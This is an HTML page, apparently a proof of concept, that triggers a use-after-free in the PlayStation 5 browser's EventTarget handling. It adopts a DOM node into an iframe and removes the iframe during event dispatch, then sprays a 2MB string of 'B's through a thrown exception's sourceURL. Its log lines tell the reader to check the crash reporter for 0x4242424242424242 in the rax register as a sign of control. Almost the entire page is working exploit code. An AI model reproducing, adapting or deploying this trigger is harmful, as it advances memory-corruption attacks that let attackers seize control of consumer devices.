<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v51 - EventTarget UAF</title>
<style>
body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
pre { white-space: pre-wrap; word-wrap: break-word; }
</style>
</head>
<body>
<pre id="out"></pre>
<script>
var out = document.getElementById("out");
function log(m) { out.textContent += m + "\n"; }

log("=== EventTarget UAF Diagnostic ===\n");

try {
    log("[*] Creating iframe...");
    const f = document.body.appendChild(document.createElement('iframe'));
    
    log("[*] Creating DOM structure...");
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));
    
    log("[*] Registering event listeners...");
    a.addEventListener('a', eval(`(function () {
        document.adoptNode(a);
        f.remove();
        log("[*] Throwing controlled exception to trigger UAF cleanup...");
        throw {
            line: 1,
            column: 1,
            sourceURL: 'B'.repeat(1024 * 1024 * 2) // 2MB spray instead of 64MB
        };
    })`));
    
    a.addEventListener('a', () => {});
    
    b.addEventListener('a', () => {
        log("[*] Adopting node to iframe...");
        f.contentDocument.adoptNode(a);
    });
    
    log("[*] Dispatching event...\n");
    b.dispatchEvent(new Event('a', { bubbles: true }));
    
    log("[+] Event dispatch completed without crash!");
    log("[*] Checking for memory corruption...");
    
    // If we reach here, the UAF might have happened silently
    // We can try to read properties to see if they are corrupted
    log("[*] a.parentNode: " + (a.parentNode ? a.parentNode.nodeName : "null"));
    log("[*] b.parentNode: " + (b.parentNode ? b.parentNode.nodeName : "null"));
    
    log("\n=== Diagnostic Complete ===");
    
} catch(e) {
    log("\n[!] EXCEPTION CAUGHT: " + e.message);
    log("[!] If this is a memory access error, the UAF is alive.");
    log("[!] Check PS5 crash reporter for 'rax' value. If it contains 0x4242424242424242, we have control.");
}
</script>
</body>
</html>
